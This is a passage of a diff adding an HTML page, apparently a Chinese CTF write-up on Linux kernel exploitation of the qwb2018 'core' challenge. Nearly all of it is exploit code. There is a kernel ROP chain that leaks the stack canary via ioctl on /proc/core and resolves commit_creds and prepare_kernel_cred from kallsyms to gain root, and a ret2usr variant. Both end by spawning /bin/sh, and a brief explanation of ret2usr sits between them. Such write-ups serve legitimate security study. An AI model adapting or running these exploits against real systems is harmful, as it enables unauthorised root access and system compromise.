+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">mov user_sp,rsp;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">pushf;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">pop user_rflags;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">  );
+</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] status has been saved.</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">size_t </span><span style="color:#8fa1b3;">getvmlinuxbase</span><span style="color:#c0c5ce;">(){
+</span><span style="color:#c0c5ce;">	FILE *fd_vm = </span><span style="color:#96b5b4;">fopen</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/tmp/kallsyms</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">r</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(!fd_vm){
+</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">open kallsyms failed</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> buf[</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">] = {</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">while</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">fgets</span><span style="color:#c0c5ce;">(buf, </span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">, fd_vm)){
+</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(commit_creds &amp;&amp; prepare_kernel_cred)
+</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">strstr</span><span style="color:#c0c5ce;">(buf, &quot;</span><span style="color:#a3be8c;">commit_creds</span><span style="color:#c0c5ce;">&quot;) &amp;&amp; !commit_creds){
+</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> hex[</span><span style="color:#d08770;">0x20</span><span style="color:#c0c5ce;">] = {</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">			</span><span style="color:#96b5b4;">strncpy</span><span style="color:#c0c5ce;">(hex, buf, </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">			</span><span style="color:#96b5b4;">sscanf</span><span style="color:#c0c5ce;">(hex, &quot;</span><span style="color:#d08770;">%llx</span><span style="color:#c0c5ce;">&quot;, (</span><span style="color:#b48ead;">long long</span><span style="color:#c0c5ce;">*)&amp;commit_creds);
+</span><span style="color:#c0c5ce;">			vmlinux_base = commit_creds - </span><span style="color:#d08770;">0x9c8e0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">			</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*]vmlinux_base ==&gt; 0x</span><span style="color:#d08770;">%llx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, *(</span><span style="color:#b48ead;">long long</span><span style="color:#c0c5ce;">*)&amp;vmlinux_base);
+</span><span style="color:#c0c5ce;">		}
+</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">strstr</span><span style="color:#c0c5ce;">(buf, &quot;</span><span style="color:#a3be8c;">prepare_kernel_cred</span><span style="color:#c0c5ce;">&quot;) &amp;&amp; !prepare_kernel_cred){
+</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> hex[</span><span style="color:#d08770;">0x20</span><span style="color:#c0c5ce;">] = {</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">			</span><span style="color:#96b5b4;">strncpy</span><span style="color:#c0c5ce;">(hex, buf, </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">			</span><span style="color:#96b5b4;">sscanf</span><span style="color:#c0c5ce;">(hex, &quot;</span><span style="color:#d08770;">%llx</span><span style="color:#c0c5ce;">&quot;, (</span><span style="color:#b48ead;">long long</span><span style="color:#c0c5ce;">*)&amp;prepare_kernel_cred);
+</span><span style="color:#c0c5ce;">			vmlinux_base = prepare_kernel_cred-</span><span style="color:#d08770;">0x9cce0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">			</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*]vmlinux_base ==&gt; 0x</span><span style="color:#d08770;">%llx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, *(</span><span style="color:#b48ead;">long long</span><span style="color:#c0c5ce;">*)&amp;vmlinux_base);
+</span><span style="color:#c0c5ce;">		}
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">getshell</span><span style="color:#c0c5ce;">(){
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(!</span><span style="color:#8fa1b3;">getuid</span><span style="color:#c0c5ce;">()){
+</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*]Root now</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">not root yet</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">save_status</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">getvmlinuxbase</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*]commit_creds: 0x</span><span style="color:#d08770;">%llx</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">[*]prepare_kernel_cred: 0x</span><span style="color:#d08770;">%llx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, (</span><span style="color:#b48ead;">long long</span><span style="color:#c0c5ce;">)commit_creds, (</span><span style="color:#b48ead;">long long</span><span style="color:#c0c5ce;">)prepare_kernel_cred);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/proc/core</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	size_t rop[</span><span style="color:#d08770;">0x500</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> ca[</span><span style="color:#d08770;">0x50</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*)rop, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x500</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(ca, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x50</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, </span><span style="color:#d08770;">0x6677889C</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, </span><span style="color:#d08770;">0x6677889B</span><span style="color:#c0c5ce;">, ca);
+</span><span style="color:#c0c5ce;">	size_t canary = *(</span><span style="color:#b48ead;">long long</span><span style="color:#c0c5ce;">*)ca;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">canary: 0x</span><span style="color:#d08770;">%llx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, (</span><span style="color:#b48ead;">long long</span><span style="color:#c0c5ce;">)canary);
+</span><span style="color:#c0c5ce;">	size_t offset = vmlinux_base - raw_vmlinux_base;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(i = </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">; i++)
+</span><span style="color:#c0c5ce;">		rop[i] = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	rop[i++] = canary;
+</span><span style="color:#c0c5ce;">	rop[i++] = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	rop[i++] = prdi_r+offset;
+</span><span style="color:#c0c5ce;">	rop[i++] = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	rop[i++] = prepare_kernel_cred;
+</span><span style="color:#c0c5ce;">	rop[i++] = prdx_r+offset;
+</span><span style="color:#c0c5ce;">	rop[i++] = prcx_r+offset;
+</span><span style="color:#c0c5ce;">	rop[i++] = mov_rdi_rax_call_rdx+offset;
+</span><span style="color:#c0c5ce;">	rop[i++] = commit_creds;
+</span><span style="color:#c0c5ce;">	rop[i++] = swapgs_popfq_r+offset;
+</span><span style="color:#c0c5ce;">	rop[i++] = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	rop[i++] = ireq_ret+offset;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    rop[i++] = (size_t)getshell;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    rop[i++] = user_cs;
+</span><span style="color:#c0c5ce;">    rop[i++] = user_rflags;
+</span><span style="color:#c0c5ce;">    rop[i++] = user_sp;
+</span><span style="color:#c0c5ce;">    rop[i++] = user_ss;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(fd, rop, </span><span style="color:#d08770;">0x500</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, </span><span style="color:#d08770;">0x6677889A</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xffffffffffff0000 </span><span style="color:#c0c5ce;">| (</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">));
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(fd);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<h1 id="ret2usr">ret2usr</h1><p>ret2usr 攻击利用了 用户空间的进程不能访问内核空间，但内核空间能访问用户空间 这个特性来定向内核代码或数据流指向用户控件，以 ring 0 特权执行用户空间代码完成提权等操作</p>
+<p>执行存储在用户态空间中的函数
+例题还是qwb2018 core
+kernel下rop，返回到用户态地址执行提权函数，然后继续rop返回用户空间</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stropts.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/wait.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/stat.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">size_t user_cs,user_ss,user_rflags,user_sp;
+</span><span style="color:#c0c5ce;">size_t commit_creds=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,prepare_kernel_cred=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t vmlinux_base;
+</span><span style="color:#c0c5ce;">size_t raw_vmlinux_base = </span><span style="color:#d08770;">0xffffffff81000000</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t prdi_r = </span><span style="color:#d08770;">0xffffffff81000b2f</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t prsi_r = </span><span style="color:#d08770;">0xffffffff810011d6</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t prdx_r = </span><span style="color:#d08770;">0xffffffff810a0f49</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t prcx_r = </span><span style="color:#d08770;">0xffffffff81021e53</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t swapgs_popfq_r = </span><span style="color:#d08770;">0xffffffff81a012da</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t mov_rdi_rax_call_rdx = </span><span style="color:#d08770;">0xffffffff8101aa6a</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t ireq_ret = </span><span style="color:#d08770;">0xffffffff81050ac2</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">save_status</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">__asm__</span><span style="color:#c0c5ce;">(
+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">mov user_cs,cs;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">mov user_ss,ss;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">mov user_sp,rsp;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">pushf;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">pop user_rflags;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">  );
+</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] status has been saved.</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">size_t </span><span style="color:#8fa1b3;">BeRoot</span><span style="color:#c0c5ce;">(){
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">* (*func1)(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">) = prepare_kernel_cred;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">* (*func2)(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*) = commit_creds;
+</span><span style="color:#c0c5ce;">	(*func2)((*func1)(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">));
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">size_t </span><span style="color:#8fa1b3;">getvmlinuxbase</span><span style="color:#c0c5ce;">(){
+</span><span style="color:#c0c5ce;">	FILE *fd_vm = </span><span style="color:#96b5b4;">fopen</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/tmp/kallsyms</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">r</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(!fd_vm){
+</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">open kallsyms failed</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> buf[</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">] = {</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">while</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">fgets</span><span style="color:#c0c5ce;">(buf, </span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">, fd_vm)){
+</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(commit_creds &amp;&amp; prepare_kernel_cred)
+</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">strstr</span><span style="color:#c0c5ce;">(buf, &quot;</span><span style="color:#a3be8c;">commit_creds</span><span style="color:#c0c5ce;">&quot;) &amp;&amp; !commit_creds){
+</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> hex[</span><span style="color:#d08770;">0x20</span><span style="color:#c0c5ce;">] = {</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">			</span><span style="color:#96b5b4;">strncpy</span><span style="color:#c0c5ce;">(hex, buf, </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">			</span><span style="color:#96b5b4;">sscanf</span><span style="color:#c0c5ce;">(hex, &quot;</span><span style="color:#d08770;">%llx</span><span style="color:#c0c5ce;">&quot;, (</span><span style="color:#b48ead;">long long</span><span style="color:#c0c5ce;">*)&amp;commit_creds);
+</span><span style="color:#c0c5ce;">			vmlinux_base = commit_creds - </span><span style="color:#d08770;">0x9c8e0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">			</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*]vmlinux_base ==&gt; 0x</span><span style="color:#d08770;">%llx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, *(</span><span style="color:#b48ead;">long long</span><span style="color:#c0c5ce;">*)&amp;vmlinux_base);
+</span><span style="color:#c0c5ce;">		}
+</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">strstr</span><span style="color:#c0c5ce;">(buf, &quot;</span><span style="color:#a3be8c;">prepare_kernel_cred</span><span style="color:#c0c5ce;">&quot;) &amp;&amp; !prepare_kernel_cred){
+</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> hex[</span><span style="color:#d08770;">0x20</span><span style="color:#c0c5ce;">] = {</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">			</span><span style="color:#96b5b4;">strncpy</span><span style="color:#c0c5ce;">(hex, buf, </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">			</span><span style="color:#96b5b4;">sscanf</span><span style="color:#c0c5ce;">(hex, &quot;</span><span style="color:#d08770;">%llx</span><span style="color:#c0c5ce;">&quot;, (</span><span style="color:#b48ead;">long long</span><span style="color:#c0c5ce;">*)&amp;prepare_kernel_cred);
+</span><span style="color:#c0c5ce;">			vmlinux_base = prepare_kernel_cred-</span><span style="color:#d08770;">0x9cce0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">			</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*]vmlinux_base ==&gt; 0x</span><span style="color:#d08770;">%llx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, *(</span><span style="color:#b48ead;">long long</span><span style="color:#c0c5ce;">*)&amp;vmlinux_base);
+</span><span style="color:#c0c5ce;">		}
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">getshell</span><span style="color:#c0c5ce;">(){
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(!</span><span style="color:#8fa1b3;">getuid</span><span style="color:#c0c5ce;">()){
+</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*]Root now</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">not root yet</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">save_status</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">getvmlinuxbase</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*]commit_creds: 0x</span><span style="color:#d08770;">%llx</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">[*]prepare_kernel_cred: 0x</span><span style="color:#d08770;">%llx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, (</span><span style="color:#b48ead;">long long</span><span style="color:#c0c5ce;">)commit_creds, (</span><span style="color:#b48ead;">long long</span><span style="color:#c0c5ce;">)prepare_kernel_cred);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/proc/core</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	size_t rop[</span><span style="color:#d08770;">0x500</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> ca[</span><span style="color:#d08770;">0x50</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*)rop, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x500</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(ca, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x50</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, </span><span style="color:#d08770;">0x6677889C</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, </span><span style="color:#d08770;">0x6677889B</span><span style="color:#c0c5ce;">, ca);
+</span><span style="color:#c0c5ce;">	size_t canary = *(</span><span style="color:#b48ead;">long long</span><span style="color:#c0c5ce;">*)ca;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">canary: 0x</span><span style="color:#d08770;">%llx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, (</span><span style="color:#b48ead;">long long</span><span style="color:#c0c5ce;">)canary);
+</span><span style="color:#c0c5ce;">	size_t offset = vmlinux_base - raw_vmlinux_base;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(i = </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">; i++)
+</span><span style="color:#c0c5ce;">		rop[i] = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	rop[i++] = canary;
+</span><span style="color:#c0c5ce;">	rop[i++] = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	rop[i++] = BeRoot;
+</span><span style="color:#c0c5ce;">	rop[i++] = swapgs_popfq_r+offset;
+</span><span style="color:#c0c5ce;">	rop[i++] = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	rop[i++] = ireq_ret+offset;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    rop[i++] = (size_t)getshell;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    rop[i++] = user_cs;
+</span><span style="color:#c0c5ce;">    rop[i++] = user_rflags;
+</span><span style="color:#c0c5ce;">    rop[i++] = user_sp;
+</span><span style="color:#c0c5ce;">    rop[i++] = user_ss;
+</span><span style="color:#c0c5ce;">
